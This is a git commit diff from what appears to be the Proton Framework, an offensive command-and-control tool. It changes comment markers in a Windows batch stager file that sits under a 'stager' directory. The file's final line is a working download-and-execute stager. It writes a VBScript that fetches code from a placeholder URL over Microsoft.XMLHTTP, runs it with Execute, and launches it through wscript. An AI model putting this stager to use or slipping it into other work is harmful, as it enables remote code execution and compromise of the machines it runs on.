7f74a00ecfad001d5744c80cd9359037eb355d2d
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-02-09 11:48:28 +0300

    Update disk.cmd

--- data/stager/vbscript/disk.cmd
+++ data/stager/vbscript/disk.cmd
@@ -1,19 +1,19 @@
-REM            ---------------------------------------------------
-REM                             Proton Framework              
-REM            ---------------------------------------------------
+:            ---------------------------------------------------
+:                             Proton Framework              
+:            ---------------------------------------------------
 :                Copyright (C) <2019-2020>  <Entynetproject>
-REM
-REM        This program is free software: you can redistribute it and/or modify
-REM        it under the terms of the GNU General Public License as published by
-REM        the Free Software Foundation, either version 3 of the License, or
-REM        any later version.
-REM
-REM        This program is distributed in the hope that it will be useful,
-REM        but WITHOUT ANY WARRANTY; without even the implied warranty of
-REM        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-REM        GNU General Public License for more details.
-REM
-REM        You should have received a copy of the GNU General Public License
-REM        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+:
+:        This program is free software: you can redistribute it and/or modify
+:        it under the terms of the GNU General Public License as published by
+:        the Free Software Foundation, either version 3 of the License, or
+:        any later version.
+:
+:        This program is distributed in the hope that it will be useful,
+:        but WITHOUT ANY WARRANTY; without even the implied warranty of
+:        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+:        GNU General Public License for more details.
+:
+:        You should have received a copy of the GNU General Public License
+:        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 echo on error resume next:Set x=CreateObject("Microsoft.XMLHTTP"):x.open"GET","~URL~",false:x.send:Execute x.responseText>~DIRECTORY~/~FILE~.vbs&start wscript ~DIRECTORY~/~FILE~.vbs
